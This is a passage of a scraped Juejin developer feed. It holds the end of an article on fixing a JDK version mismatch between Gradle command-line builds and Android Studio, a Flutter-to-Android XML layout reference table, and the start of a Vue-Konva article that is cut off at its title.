.contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>同一 Android 项目在命令行执行 <code>./gradlew assembleDebug</code> 构建成功，但在 Android Studio 中同步时却报错：</p>
<pre><code class="hljs language-kotlin" lang="kotlin">Unsupported <span class="hljs-keyword">class</span> <span class="hljs-title class_">file</span> <span class="hljs-title">major</span> <span class="hljs-title">version</span> 65
...
Could not <span class="hljs-keyword">open</span> <span class="hljs-keyword">init</span> generic <span class="hljs-keyword">class</span> <span class="hljs-title class_">cache</span> ... <span class="hljs-title">D</span>:<span class="hljs-type">\tools\Java\jdk1.8.0_211\caches\8.0</span>
</code></pre>
<h2 data-id="heading-0">原因分析</h2>
<p>命令行构建通过 <code>gradle.properties</code> 中的 <code>org.gradle.java.home</code> 配置正确使用 JDK 17，而 Android Studio 默认使用系统环境变量或嵌入式 JDK，意外拾取了机器上残留的 JDK 8，导致版本不兼容。</p>
<h2 data-id="heading-1">解决方案</h2>
<h3 data-id="heading-2">1. 固定 Gradle JDK 路径</h3>
<p>在 <code>gradle.properties</code> 中明确指定：</p>
<pre><code class="hljs language-bash" lang="bash">org.gradle.java.home=D:/tools/Java/jdk-17.0.2+8
</code></pre>
<h3 data-id="heading-3">2. 配置 Gradle Toolchain</h3>
<p>在根 <code>build.gradle</code> 中声明：</p>
<pre><code class="hljs language-kotlin" lang="kotlin">java {
    toolchain {
        languageVersion.<span class="hljs-keyword">set</span>(JavaLanguageVersion.of(<span class="hljs-number">17</span>))
    }
}
</code></pre>
<h3 data-id="heading-4">3. 统一 IDE 设置</h3>
<p>在 Android Studio 中：</p>
<ul>
<li>打开 <code>File &gt; Settings &gt; Build Tools &gt; Gradle</code></li>
<li>将 Gradle JDK 指向项目指定的 JDK 17 路径</li>
<li>确保 <code>.idea/gradle.xml</code> 中配置正确并纳入版本控制</li>
</ul>
<h2 data-id="heading-5">总结</h2>
<p>命令行与 Android Studio 的构建差异主要源于环境配置不一致。通过将 JDK 版本信息写入项目配置文件，可以实现环境标准化，确保跨环境构建的一致性。核心原则是：<strong>配置即代码，环境也应该被托管</strong>。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Flutter 布局 ↔ Android XML 布局 对照表（含常用属性）]]></title>    <link>https://juejin.cn/post/7575757258833281050</link>    <guid>https://juejin.cn/post/7575757258833281050</guid>    <pubDate>2025-11-24T03:43:29.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575757258833281050" data-draft-id="7575748159608569882" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Flutter 布局 ↔ Android XML 布局 对照表（含常用属性）"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2025-11-24T03:43:29.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="renxhui"/> <meta itemprop="url" content="https://juejin.cn/user/1292681403181944"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Flutter 布局 ↔ Android XML 布局 对照表（含常用属性）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1292681403181944/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    renxhui
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T03:43:29.000Z" title="Mon Nov 24 2025 03:43:29 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Flutter 布局 ↔ Android XML 布局 对照表（含常用属性）</h2>
<blockquote>
<p>面向快速查阅：Flutter 组件与 Android XML 视图/容器的一一对应与常见属性对照。</p>
</blockquote>
<h3 data-id="heading-1">布局容器</h3>




























































































































<table><thead><tr><th>Flutter</th><th>Android XML</th><th>用途/备注</th><th>Flutter 常用属性</th><th>Android 常用属性</th></tr></thead><tbody><tr><td>Container</td><td>FrameLayout / LinearLayout(单子项)</td><td>单子项容器，背景/圆角/内外边距</td><td>width, height, padding, margin, alignment, decoration(BoxDecoration: color, border, borderRadius, boxShadow)</td><td>layout_width/height, padding, margin, background, foreground, layout_gravity</td></tr><tr><td>Row</td><td>LinearLayout (horizontal)</td><td>水平排布</td><td>mainAxisAlignment, crossAxisAlignment, mainAxisSize, children</td><td>orientation="horizontal", gravity, layout_gravity</td></tr><tr><td>Column</td><td>LinearLayout (vertical)</td><td>垂直排布</td><td>mainAxisAlignment, crossAxisAlignment, mainAxisSize, children</td><td>orientation="vertical", gravity, layout_gravity</td></tr><tr><td>Expanded / Flexible</td><td>layout_weight</td><td>占据剩余空间/权重</td><td>flex, fit (tight/loose)</td><td>layout_weight, weightSum</td></tr><tr><td>Stack</td><td>FrameLayout / RelativeLayout / ConstraintLayout</td><td>层叠定位</td><td>alignment, fit, clipBehavior</td><td>FrameLayout: layout_gravity；Relative/Constraint: 定位约束</td></tr><tr><td>Positioned</td><td>RelativeLayout/ConstraintLayout params</td><td>绝对/相对定位</td><td>left, right, top, bottom, width, height</td><td>layout_alignParent*, toStartOf/toEndOf, constraints</td></tr><tr><td>Align / Center</td><td>gravity / layout_gravity</td><td>父内对齐</td><td>alignment(Alignment)</td><td>gravity（父），layout_gravity（子）</td></tr><tr><td>Padding</td><td>View padding</td><td>内边距</td><td>padding(EdgeInsets)</td><td>padding</td></tr><tr><td>SizedBox</td><td>layout_width/height</td><td>固定宽高/留白</td><td>width, height</td><td>layout_width/height，空 View</td></tr><tr><td>Wrap</td><td>FlexboxLayout(支持库) / Flow</td><td>自动换行流式布局</td><td>direction, spacing, runSpacing, alignment</td><td>app:flexWrap, app:justifyContent, app:alignItems（FlexboxLayout）</td></tr><tr><td>ListView</td><td>RecyclerView / ListView</td><td>可滚动列表</td><td>builder, separated, itemExtent, physics</td><td>RecyclerView: adapter, layoutManager；ListView: divider, dividerHeight</td></tr><tr><td>GridView</td><td>RecyclerView + GridLayoutManager / GridView</td><td>网格</td><td>gridDelegate, crossAxisSpacing, mainAxisSpacing</td><td>spanCount(GridLayoutManager), verticalSpacing, horizontalSpacing</td></tr><tr><td>SingleChildScrollView</td><td>ScrollView / NestedScrollView</td><td>单子项滚动</td><td>scrollDirection, physics</td><td>fillViewport, nestedScrollingEnabled</td></tr><tr><td>PageView</td><td>ViewPager2</td><td>分页滑动</td><td>controller, pageSnapping</td><td>offscreenPageLimit, orientation</td></tr><tr><td>SafeArea</td><td>fitsSystemWindows</td><td>适配状态栏/刘海</td><td>minimum, top/bottom</td><td>android:fitsSystemWindows</td></tr><tr><td>AspectRatio</td><td>ConstraintLayout ratio</td><td>宽高比</td><td>aspectRatio</td><td>app:layout_constraintDimensionRatio</td></tr></tbody></table>
<h3 data-id="heading-2">常用组件</h3>





































































































<table><thead><tr><th>Flutter</th><th>Android XML</th><th>Flutter 常用属性</th><th>Android 常用属性</th></tr></thead><tbody><tr><td>Text</td><td>TextView</td><td>style, maxLines, overflow, textAlign</td><td>textSize(sp), textColor, maxLines, ellipsize, gravity</td></tr><tr><td>Image</td><td>ImageView</td><td>image(Asset/Network/File), fit(BoxFit), colorBlendMode</td><td>src, scaleType, tint</td></tr><tr><td>Icon</td><td>ImageView(Vector)</td><td>size, color</td><td>srcCompat(vector), tint</td></tr><tr><td>ElevatedButton</td><td>Button (Material)</td><td>onPressed, style(elevation, shape, backgroundColor)</td><td>onClick, backgroundTint, textAllCaps</td></tr><tr><td>OutlinedButton</td><td>Button + shape drawable</td><td>onPressed, side, shape</td><td>background, stroke, ripple</td></tr><tr><td>TextButton</td><td>Button(flat)</td><td>onPressed, style</td><td>textColor, ripple</td></tr><tr><td>Switch</td><td>SwitchCompat</td><td>value, onChanged, activeColor</td><td>checked, onCheckedChange, thumbTint</td></tr><tr><td>Checkbox</td><td>CheckBox</td><td>value, onChanged, tristate</td><td>checked, buttonTint</td></tr><tr><td>Radio</td><td>RadioButton</td><td>value, groupValue, onChanged</td><td>checked, buttonTint</td></tr><tr><td>Slider</td><td>SeekBar</td><td>value, min/max, divisions, label</td><td>progress, max</td></tr><tr><td>TextField / TextFormField</td><td>EditText (+ TextInputLayout)</td><td>controller, decoration(hint, prefix/suffix), keyboardType, obscureText</td><td>hint, inputType, maxLines, imeOptions</td></tr><tr><td>CircularProgressIndicator</td><td>ProgressBar (indeterminate)</td><td>strokeWidth, value</td><td>style="?android:attr/progressBarStyleLarge", indeterminate</td></tr><tr><td>LinearProgressIndicator</td><td>ProgressBar (horizontal)</td><td>minHeight, value</td><td>style="?android:attr/progressBarStyleHorizontal"</td></tr><tr><td>Card</td><td>CardView</td><td>elevation, margin, shape</td><td>cardUseCompatPadding, cardCornerRadius, cardElevation</td></tr><tr><td>Divider</td><td>View(height=1dp)</td><td>thickness, indent, color</td><td>layout_height, background</td></tr></tbody></table>
<h3 data-id="heading-3">属性对照与要点</h3>
<ul>
<li>
<p>宽高与权重</p>
<ul>
<li>Flutter: <code>SizedBox</code> / <code>Container(width/height)</code> 或 <code>constraints</code>；伸展用 <code>Expanded(flex)</code> / <code>Flexible(flex)</code>。</li>
<li>Android: <code>layout_width/height = wrap_content | match_parent</code>；伸展用 <code>layout_weight</code>（配合 <code>weightSum</code>）。</li>
</ul>
</li>
<li>
<p>对齐与重力</p>
<ul>
<li>Flutter: 行列用 <code>mainAxisAlignment</code> / <code>crossAxisAlignment</code>；单子项用 <code>Align(alignment)</code> / <code>Center</code>。</li>
<li>Android: 父容器对齐 <code>gravity</code>，子视图在父内的对齐 <code>layout_gravity</code>。</li>
</ul>
</li>
<li>
<p>间距</p>
<ul>
<li>Flutter: <code>padding</code> / <code>margin</code>（<code>Container(margin:)</code>）或 <code>SizedBox</code> 间隔；列表分隔用 <code>Divider</code> / <code>ListView.separated</code>。</li>
<li>Android: <code>padding</code> / <code>layout_margin</code>；<code>LinearLayout</code> 可用 <code>divider</code> / <code>showDividers</code>。</li>
</ul>
</li>
<li>
<p>叠放与定位</p>
<ul>
<li>Flutter: <code>Stack</code> + <code>Positioned(top/left/right/bottom)</code>；复杂约束可用 <code>LayoutBuilder</code> 等。</li>
<li>Android: <code>FrameLayout</code> 简单覆盖；<code>RelativeLayout/ConstraintLayout</code> 精细约束（如 ratio）。</li>
</ul>
</li>
<li>
<p>圆角、边框、阴影</p>
<ul>
<li>Flutter: <code>BoxDecoration(borderRadius, border, boxShadow)</code>；卡片阴影用 <code>Card</code> 或 <code>Material(elevation)</code>。</li>
<li>Android: shape drawable <code>&lt;shape&gt;&lt;corners/&gt;&lt;stroke/&gt;&lt;/shape&gt;</code>；<code>elevation</code> / <code>cardElevation</code>。</li>
</ul>
</li>
<li>
<p>图片填充</p>
<ul>
<li>Flutter: <code>fit: BoxFit.cover / contain / fill</code>。</li>
<li>Android: <code>scaleType="centerCrop / fitCenter / fitXY"</code>。</li>
</ul>
</li>
<li>
<p>滚动与复用</p>
<ul>
<li>Flutter: <code>ListView.builder</code> / <code>GridView.builder</code> 按需构建。</li>
<li>Android: <code>RecyclerView</code> + <code>Adapter/ViewHolder</code> 复用。</li>
</ul>
</li>
<li>
<p>可见性</p>
<ul>
<li>Flutter: <code>Visibility</code>（gone/invisible）、<code>Offstage</code>（不布局）。</li>
<li>Android: <code>visibility="visible|invisible|gone"</code>。</li>
</ul>
</li>
<li>
<p>点击反馈（波纹）</p>
<ul>
<li>Flutter: <code>InkWell</code> / <code>InkResponse</code>（需有 <code>Material</code> 祖先）。</li>
<li>Android: <code>foreground="?attr/selectableItemBackgroundBorderless"</code> 或 <code>ripple</code>。</li>
</ul>
</li>
</ul>
<hr/>
<h3 data-id="heading-4">详细属性对照与解释</h3>
<h4 data-id="heading-5">1) 尺寸与约束（Size &amp; Constraints）</h4>









































<table><thead><tr><th>目的</th><th>Flutter</th><th>Android XML</th><th>说明</th></tr></thead><tbody><tr><td>固定宽高</td><td><code>SizedBox(width, height)</code> / <code>Container(width, height)</code></td><td><code>layout_width/height</code> = 定值dp</td><td>Flutter 中宽高为逻辑像素，Android 常用 dp；注意统一度量。</td></tr><tr><td>自适应内容</td><td>默认（未设置尺寸）</td><td><code>wrap_content</code></td><td>子内容决定大小。</td></tr><tr><td>占满父容器</td><td><code>SizedBox.expand()</code> / <code>Align(alignment).widthFactor/heightFactor</code></td><td><code>match_parent</code></td><td>Flutter 多通过父布局约束，或 <code>Expanded</code> 占满主轴剩余空间。</td></tr><tr><td>最小/最大约束</td><td><code>ConstrainedBox/BoxConstraints</code></td><td>需使用 ConstraintLayout 或在代码中测量</td><td>Flutter 提供更直接的最小/最大边界控制。</td></tr><tr><td>比例</td><td><code>AspectRatio(aspectRatio)</code></td><td><code>app:layout_constraintDimensionRatio="W:H"</code></td><td>Android 需用 ConstraintLayout 的 ratio。</td></tr></tbody></table>
<h4 data-id="heading-6">2) Flex/权重（Row/Column ↔ LinearLayout weight）</h4>



































<table><thead><tr><th>概念</th><th>Flutter</th><th>Android XML</th><th>说明</th></tr></thead><tbody><tr><td>主轴方向</td><td>Row(横) / Column(竖)</td><td>LinearLayout orientation</td><td>一致。</td></tr><tr><td>权重</td><td><code>Expanded(flex: n)</code> / <code>Flexible(flex: n)</code></td><td><code>layout_weight="n"</code>（配合 <code>weightSum</code> 可选）</td><td>多个子视图按权重分配主轴剩余空间。</td></tr><tr><td>主轴对齐</td><td><code>mainAxisAlignment</code> = start/end/center/spaceBetween/spaceAround/spaceEvenly</td><td><code>gravity</code>（对父），也可靠权重实现分布</td><td>Flutter 内置更丰富的分布方式。</td></tr><tr><td>交叉轴对齐</td><td><code>crossAxisAlignment</code> = start/end/center/stretch/baseline</td><td><code>gravity</code>（对子）+ <code>layout_gravity</code></td><td>Flutter 的 <code>stretch</code> 等价于 Android 子视图 <code>match_parent</code> 结合父 gravity。</td></tr></tbody></table>
<p>常见映射：</p>
<ul>
<li><code>mainAxisAlignment.spaceBetween</code> ≈ 子项均匀分布，首尾贴边；Android 需用 <code>weight</code> 或约束实现。</li>
<li><code>crossAxisAlignment.stretch</code> ≈ 子项交叉轴拉伸；Android 子项 <code>match_parent</code>。</li>
</ul>
<h4 data-id="heading-7">3) 对齐（Alignment ↔ gravity/layout_gravity）</h4>



















































<table><thead><tr><th>Flutter Alignment</th><th>Android</th><th>说明</th></tr></thead><tbody><tr><td><code>Alignment.center</code></td><td><code>gravity="center"</code> 或子 <code>layout_gravity="center"</code></td><td>居中</td></tr><tr><td><code>Alignment.topLeft</code></td><td>`gravity="top</td><td>start"`</td><td>左上</td></tr><tr><td><code>Alignment.topRight</code></td><td>`gravity="top</td><td>end"`</td><td>右上</td></tr><tr><td><code>Alignment.bottomLeft</code></td><td>`gravity="bottom</td><td>start"`</td><td>左下</td></tr><tr><td><code>Alignment.bottomRight</code></td><td>`gravity="bottom</td><td>end"`</td><td>右下</td></tr><tr><td><code>Alignment.centerLeft</code></td><td>`gravity="center_vertical</td><td>start"`</td><td>垂直居中靠左</td></tr><tr><td><code>Alignment.centerRight</code></td><td>`gravity="center_vertical</td><td>end"`</td><td>垂直居中靠右</td></tr></tbody></table>
<p>父容器整体对齐用 <code>gravity</code>，单个子视图在父内对齐用 <code>layout_gravity</code>。</p>
<h4 data-id="heading-8">4) 间距（Padding &amp; Margin）</h4>

























<table><thead><tr><th>Flutter</th><th>Android XML</th><th>说明</th></tr></thead><tbody><tr><td><code>Padding(padding: EdgeInsets.all(8))</code></td><td><code>padding="8dp"</code></td><td>全部边同值</td></tr><tr><td><code>EdgeInsets.symmetric(horizontal: 8, vertical: 4)</code></td><td><code>paddingStart/End/Top/Bottom</code></td><td>水平/垂直对称</td></tr><tr><td><code>Container(margin: ...)</code></td><td><code>layout_margin*</code></td><td>外边距在 Android 用 <code>layout_margin</code> 系列属性</td></tr></tbody></table>
<p>建议：统一使用 Android 的 dp 与 Flutter 的逻辑像素换算（一般 1:1 视觉等效）。</p>
<h4 data-id="heading-9">5) 文本（Text ↔ TextView）</h4>



































































<table><thead><tr><th>需求</th><th>Flutter</th><th>Android XML</th><th>说明</th></tr></thead><tbody><tr><td>字号</td><td><code>style: TextStyle(fontSize: 16)</code></td><td><code>textSize="16sp"</code></td><td>Android 使用 sp，Flutter 逻辑像素接近 sp 语义</td></tr><tr><td>颜色</td><td><code>TextStyle(color: Colors.red)</code></td><td><code>textColor</code></td><td/></tr><tr><td>字重</td><td><code>fontWeight: FontWeight.w600</code></td><td><code>textStyle="bold"</code> 或 <code>setTypeface</code></td><td>Android XML 原生支持有限</td></tr><tr><td>行高</td><td><code>height: 1.4</code></td><td><code>lineSpacingMultiplier="1.4"</code></td><td>Flutter 行高为倍数（相对 fontSize）</td></tr><tr><td>字间距</td><td><code>letterSpacing: 0.5</code></td><td><code>android:letterSpacing="0.05"</code></td><td>Android 为 em 单位（0.05≈5%）</td></tr><tr><td>装饰</td><td><code>decoration: TextDecoration.underline</code></td><td><code>paintFlags="underline"</code></td><td/></tr><tr><td>对齐</td><td><code>textAlign: center/left/right/justify</code></td><td>`gravity="center</td><td>start</td><td>end"`</td><td/></tr><tr><td>溢出省略</td><td><code>overflow: TextOverflow.ellipsis, maxLines: n</code></td><td><code>ellipsize="end", maxLines="n"</code></td><td>两端省略/中间省略需要自定义</td></tr><tr><td>自动换行</td><td><code>softWrap: true</code></td><td>默认换行</td><td/></tr></tbody></table>
<h4 data-id="heading-10">6) 图片填充（BoxFit ↔ scaleType）</h4>



































<table><thead><tr><th>Flutter <code>BoxFit</code></th><th>Android <code>scaleType</code></th><th>行为</th></tr></thead><tbody><tr><td><code>contain</code></td><td><code>fitCenter</code></td><td>等比完整显示，可能留白</td></tr><tr><td><code>cover</code></td><td><code>centerCrop</code></td><td>等比裁剪铺满，可能截断</td></tr><tr><td><code>fill</code></td><td><code>fitXY</code></td><td>拉伸铺满，可能变形</td></tr><tr><td><code>fitWidth</code></td><td><code>fitStart/fitEnd</code> + 尺寸控制</td><td>宽度充满，等比缩放</td></tr><tr><td><code>none</code></td><td><code>center</code></td><td>原始大小置中</td></tr></tbody></table>
<h4 data-id="heading-11">7) 背景、圆角、边框、阴影</h4>



































<table><thead><tr><th>效果</th><th>Flutter</th><th>Android XML</th><th>说明</th></tr></thead><tbody><tr><td>背景色</td><td><code>Container(color)</code> 或 <code>decoration.color</code></td><td><code>background</code></td><td>Flutter 建议使用 <code>decoration</code></td></tr><tr><td>圆角</td><td><code>borderRadius: BorderRadius.circular(8)</code></td><td><code>&lt;shape&gt;&lt;corners android:radius="8dp"/&gt;&lt;/shape&gt;</code></td><td>Android 采用 shape drawable</td></tr><tr><td>边框</td><td><code>border: Border.all(color, width)</code></td><td><code>&lt;stroke android:width="1dp" android:color="..."/&gt;</code></td><td/></tr><tr><td>阴影</td><td><code>boxShadow</code> / <code>Material(elevation)</code></td><td><code>elevation</code> / <code>cardElevation</code></td><td>Flutter 的 <code>elevation</code> 需 Material 语义</td></tr></tbody></table>
<h4 data-id="heading-12">8) 可见性与占位</h4>























<table><thead><tr><th>场景</th><th>Flutter</th><th>Android XML</th><th>说明</th></tr></thead><tbody><tr><td>占位但不可见</td><td><code>Visibility(visible: false, maintainSize: true)</code></td><td><code>visibility="invisible"</code></td><td>仍占据空间</td></tr><tr><td>不占位隐藏</td><td><code>Visibility(visible: false)</code> / <code>Offstage(offstage: true)</code></td><td><code>visibility="gone"</code></td><td>不参与布局</td></tr></tbody></table>
<h4 data-id="heading-13">9) 交互与手势</h4>





























<table><thead><tr><th>功能</th><th>Flutter</th><th>Android</th><th>说明</th></tr></thead><tbody><tr><td>点击</td><td><code>GestureDetector(onTap)</code> / <code>InkWell</code></td><td><code>android:onClick</code> 或 <code>setOnClickListener</code></td><td>Flutter 的 <code>InkWell</code> 有水波纹反馈</td></tr><tr><td>长按</td><td><code>onLongPress</code></td><td><code>setOnLongClickListener</code></td><td/></tr><tr><td>滑动</td><td><code>onPan*</code> / <code>onHorizontalDrag*</code></td><td><code>OnTouchListener</code> + GestureDetector</td><td>复杂手势 Flutter 更便捷</td></tr></tbody></table>
<h4 data-id="heading-14">10) 滚动与惯性</h4>























<table><thead><tr><th>需求</th><th>Flutter</th><th>Android</th><th>说明</th></tr></thead><tbody><tr><td>惯性/物理</td><td><code>physics: BouncingScrollPhysics / ClampingScrollPhysics</code></td><td><code>OverScrollMode</code>, <code>EdgeEffect</code></td><td>iOS 风格回弹用 <code>Bouncing</code></td></tr><tr><td>嵌套滚动</td><td><code>NestedScrollView</code>/Slivers</td><td><code>NestedScrollView</code></td><td>都支持 AppBar 联动等高级效果</td></tr></tbody></table>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vue-Konva 使用（缩放 / 还原 / 拖动） 示例]]></title>    <link>https://juejin.cn/post/7575757258833379354</link>    <guid>https://juejin.cn/post/7575757258833379354</guid>    <pubDate>2025-11-24T03:55:49.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575757258833379354" data-draft-id="7575748159608586266" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vue-Konva 使用（缩放 / 还原 / 拖动） 示例"/> <meta itemprop="keywords" content="前端,JavaScript,Vue.js"/> <meta itemprop="datePublished" content="2025-11-24T03:55:49.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="前端卿年"/> <meta itemprop="url" content="https://juejin.cn/user/2277843825591400"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vue-Konva 使用（缩放 / 还原 / 拖动） 示例
